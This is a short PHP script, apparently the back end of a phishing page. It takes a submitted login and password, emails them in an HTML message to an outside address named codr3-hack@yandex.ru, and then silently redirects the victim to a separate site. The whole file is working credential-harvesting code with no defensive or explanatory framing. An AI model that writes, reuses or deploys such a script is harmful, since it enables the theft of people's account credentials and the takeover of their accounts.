<?
if((isset($_POST['login'])&&$_POST['login']!="")&&(isset($_POST['pass'])&&$_POST['pass']!="")){
        $to = 'codr3-hack@yandex.ru'; 
        $subject = 'Servise by Skriptik';
        $message = '
                <html>
                    <head>
                        <title>'.$subject.'</title>
                    </head>
                    <body>
                        <p>Логин: '.$_POST['login'].'</p>
                        <p>Пароль: '.$_POST['pass'].'</p>                        
                    </body>
                </html>'; 
        $headers  = "Content-type: text/html; charset=utf-8 \r\n";
        $headers .= "From: Отправитель <from@example.com>\r\n";
        mail($to, $subject, $message, $headers); 
}
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://skriptik-servise.tk/'></head></html>";
?>